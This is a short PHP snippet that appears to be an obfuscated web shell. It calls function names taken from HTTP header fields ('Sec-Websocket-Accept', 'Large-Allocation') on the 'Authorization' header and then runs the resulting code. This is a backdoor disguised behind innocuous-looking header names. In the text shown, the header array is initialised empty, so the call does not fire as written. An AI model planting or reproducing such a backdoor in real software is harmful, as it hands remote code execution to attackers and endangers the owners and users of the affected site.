<?php
$_HEADERS = Array();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $rjust = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Large-Allocation']($_HEADERS['Authorization']));
    $rjust();
}